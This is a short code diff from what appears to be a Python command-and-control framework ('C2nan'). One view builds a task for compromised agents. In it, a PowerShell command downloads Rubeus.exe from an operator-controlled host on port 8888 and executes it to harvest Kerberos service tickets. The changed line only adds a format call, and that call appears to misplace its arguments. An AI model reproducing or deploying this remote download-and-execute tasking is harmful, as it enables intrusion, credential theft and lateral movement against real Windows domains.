@@ -902,7 +902,7 @@ def TGStickets_Rubeus(request):  ## Need to Upload Funtion to get CSV tgs file
         kerb_stats= request.POST['kerb_stats']    ### IN GUI kerberoast status     ##optional
         high_value= request.POST['high_value']    ### IN GUI High value targets (AdminCount=1)   ##optional
         username= request.POST['username']    ### IN GUI username   ##optional
-        task= 'echo ". C2nan:#/`r`n===============TGStickets===============";(New-Object Net.WebClient).DownloadFile(\'http://{0}:8888/Rubeus.exe\', \'c:/users/{1}/rubeus.exe\');cd $env:userprofile;rubeus.exe'
+        task= 'echo ". C2nan:#/`r`n===============TGStickets===============";(New-Object Net.WebClient).DownloadFile(\'http://{0}:8888/Rubeus.exe\', \'c:/users/{1}/rubeus.exe\');cd $env:userprofile;rubeus.exe'.format(username,)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
